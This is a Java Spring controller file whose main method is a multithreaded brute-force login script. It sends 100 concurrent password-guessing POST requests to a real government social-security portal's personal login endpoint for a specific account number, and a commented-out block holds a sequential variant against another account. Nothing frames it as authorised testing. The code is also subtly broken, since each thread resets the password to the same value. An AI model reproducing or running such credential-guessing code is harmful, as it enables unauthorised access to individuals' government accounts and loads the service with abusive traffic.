package com.qjp.controller;

import com.alibaba.fastjson.JSONObject;
import com.sun.jmx.snmp.tasks.Task;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.client.RestTemplate;

import java.util.Date;

/** 
 * <p>Project: BRP</p> 
 * <p>Title: TestController.java</p> 
 * <p>Description: TODO</p> 
 * <p>Copyright (c) 2016 xjw Consultancy Services</p>
 * <p>All Rights Reserved.</p>
 * @author <a href="mailto:shenyuchuan@itiaoling.com">申鱼川</a>
 */
@Controller
public class TestController {
	@RequestMapping(value = "/test", method = RequestMethod.GET)
	public void test(){
		System.out.println("aaaaaa");
	}



	public static void main(String[] args) {
		Integer pwd = 50000000;
		for(int i=0; i< 100; i++){
			Thread t = new Thread(new Task() {
				@Override
				public void cancel() {

				}
				@Override
				public void run() {
					Integer pwd = 50000000;
					String data = "username=016900000&password="+pwd +"&checkCode=&type=&tm="+ new Date().getTime();
					try{
						String url = "https://gr.cdhrss.gov.cn:442/cdwsjb/netHallLoginAction!personalLogin.do";
						RestTemplate restTemplate = new RestTemplate();
						HttpHeaders headers = new HttpHeaders();
						MediaType type = MediaType.parseMediaType("application/x-www-form-urlencoded; charset=UTF-8");
						headers.setContentType(type);
						headers.add("Accept", MediaType.APPLICATION_JSON.toString());
						HttpEntity<String> formEntity = new HttpEntity<String>(data, headers);
						String result = restTemplate.postForObject(url, formEntity, String.class);
						String success = JSONObject.parseObject(result).getString("success");
						String msg = JSONObject.parseObject(result).getString("msg");
						System.out.println(success + "-----" + msg + "----" + 50000000);
						pwd++;
					}catch (Exception e){
						e.printStackTrace();
					}
				}
			});
			t.start();
		}


			/*String data = "username=016908600&password="+pwd +"&checkCode=&type=&tm="+ new Date().getTime();
			try{
				String url = "https://gr.cdhrss.gov.cn:442/cdwsjb/netHallLoginAction!personalLogin.do";
				RestTemplate restTemplate = new RestTemplate();
				HttpHeaders headers = new HttpHeaders();
				MediaType type = MediaType.parseMediaType("application/x-www-form-urlencoded; charset=UTF-8");
				headers.setContentType(type);
				headers.add("Accept", MediaType.APPLICATION_JSON.toString());
				HttpEntity<String> formEntity = new HttpEntity<String>(data, headers);
				String result = restTemplate.postForObject(url, formEntity, String.class);
				String success = JSONObject.parseObject(result).getString("success");
				String msg = JSONObject.parseObject(result).getString("msg");
				System.out.println(success + "-----" + msg + "----" + pwd);
				pwd++;
			}catch (Exception e){
				e.printStackTrace();
			}*/

	}
}

